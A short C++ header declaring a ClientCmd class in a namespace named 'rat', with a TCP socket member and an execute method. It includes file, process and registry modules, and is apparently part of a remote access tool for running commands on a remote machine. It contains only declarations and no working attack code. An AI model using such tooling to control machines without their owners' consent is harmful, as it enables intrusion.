#pragma once

#include "command/command.h"
#include "socket/tcpsocket.h"
#include "file/file.h"
#include "process/process.h"
#ifdef _WIN32
#include "registry/registry.h"
#endif
#include <string.h>
#include <iostream>
#include <vector>
#include <sstream>
namespace rat{

    class ClientCmd: public Command
    {
    private:
        TcpSocket socket_;
        void HandleInput(const char* input, int size);
    public:
        ClientCmd();
        ClientCmd(const TcpSocket& socket, const char* input, int size);
        void SetSocket(const TcpSocket& socket);
        ~ClientCmd() = default;;
        bool execute();
    };
    
    
}